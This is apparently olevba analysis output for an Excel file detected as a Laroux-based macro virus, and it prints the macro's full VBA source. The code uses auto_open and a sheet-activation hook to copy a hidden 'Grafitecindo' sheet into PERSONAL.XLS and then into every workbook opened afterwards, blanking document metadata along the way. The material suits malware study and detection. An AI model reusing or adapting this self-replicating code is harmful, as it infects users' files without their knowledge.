olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-9de4a70c6169cb15580d95fbd3177cfe128f5886
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Grafitecindo.bas 
in file: Virus.MSExcel.Laroux-based-9de4a70c6169cb15580d95fbd3177cfe128f5886 - OLE stream: '_VBA_PROJECT_CUR/VBA/Grafitecindo'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 






Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "check_files"
End Sub

Sub check_files()
Attribute check_files.VB_ProcData.VB_Invoke_Func = " \n14"
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "PERSONAL.XLS")
    If m$ = "PERSONAL.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10
    
Select Case whichfile
    Case 10
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    Sheets("Grafitecindo").Visible = True
    Sheets("Grafitecindo").Select
    Sheets("Grafitecindo").Copy
    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
    End With
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs FileName:=Application.StartupPath & "/" & "PERSONAL.XLS", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    ChDir c4$
    Workbooks(n4$).Sheets("Grafitecindo").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "PERSONAL.xls!check_files"
    Case 1
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    s$ = Workbooks(n4$).Sheets(1).Name
    If s$ <> "Grafitecindo" Then
        Workbooks("PERSONAL.XLS").Sheets("Grafitecindo").Copy before:=Workbooks(n4$).Sheets(1)
        Workbooks(n4$).Sheets("Grafitecindo").Visible = False
    Else
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "PERSONAL.xls!check_files"
    Case Else
End Select
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     20 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  Grafitecind
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Foglio
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Foglio
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Foglio
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

